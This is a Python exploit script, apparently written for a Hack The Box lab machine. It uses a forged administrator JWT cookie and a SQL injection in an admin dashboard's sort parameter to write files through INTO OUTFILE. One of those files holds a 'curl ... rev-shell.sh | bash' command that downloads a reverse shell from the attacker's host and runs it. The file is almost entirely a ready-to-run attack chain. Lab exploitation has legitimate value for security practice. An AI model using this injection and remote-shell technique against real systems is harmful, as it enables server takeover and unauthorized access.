import requests

#set up your web server with python3 -m http.server {port} inside the folder containing the rev-shell.sh file
your_ip = '10.10.16.41'
port = 9090

proxies = {'http':'http://localhost:8080'}
admin_cookie = {"X-AUTH-Token": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6InJhbmRvbUBtYWlsLmNvbSIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzM3ODg3Mjg2LCJleHAiOjE3Mzc4OTA4ODYsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTA3MjM1NTIyNTU4NDY1MjYyMzI0NDg0OTI4OTg0NTgxMTE0Njc0MDU2Nzk0ODMyMzg1OTAwMTg1NDQ0MDcwODkzNDI2NTY3NzcyMTAwMzY1MDQ4NzM2NDU0MDM1MDgxMDEwODY4OTE3NzgwNDExNDEwNDU2NjYyODk3OTgxMzc5MjA4MTc2MzgyNTE4MzUzMjU2OTM0NTQ0NzkyODY1MjMxNjQyMzAyNTc0NDE1ODEwMTg4NzQyNTQwMjM0MTAyMzIyMTM4ODYyMDI1MDEwMzkyMjcwMTk3MjAyNzMwNjI5MDYwNzE1MDQxMzM4NzcyNTY1Mjg4MTY3ODY4OTU0NjExOTg1NjcwMjYyMDI5NDgxNTgyOTgxMTQ1MTg4NDQ5MjM3MTQxNDc2NDcyNDA4ODEyNjYyMTg3MTc3IiwiZSI6NjU1Mzd9fQ.Bk8KzftjJmY-HLtsi-1wp0p0kvpRk4u93h7_yBMMQSjmQDtNS_zUJGAXE207PS1rpBBF6K0WZg6U1ufZ84HUbgdoBuSR6kybj2KWxe_lypo2abtUGOLHDZ6gVinhJGf6U2e1DtYLX2Tpfc3WmwKonDip3nWlnOASAUaWSUCOEn9XL6s"}

url = "http://yummy.htb:80/admindashboard?s=y&o=ASC"
sqli = ";select+'{}'+INTO+OUTFILE++'{}'"

# modify the content of dbstatus.json
requests.get(url + sqli.format("something","/data/scripts/dbstatus.json"), cookies=admin_cookie, proxies=proxies)

# modify the content of fixer-v*latest* (if you need to change it again you need to create another file with a higher version number)
requests.get(url + sqli.format(f"curl http://{your_ip}:{port}/rev-shell.sh | bash","/data/scripts/fixer-v99999"), cookies=admin_cookie, proxies=proxies)

print("Wait at max 1 minute for the connection!")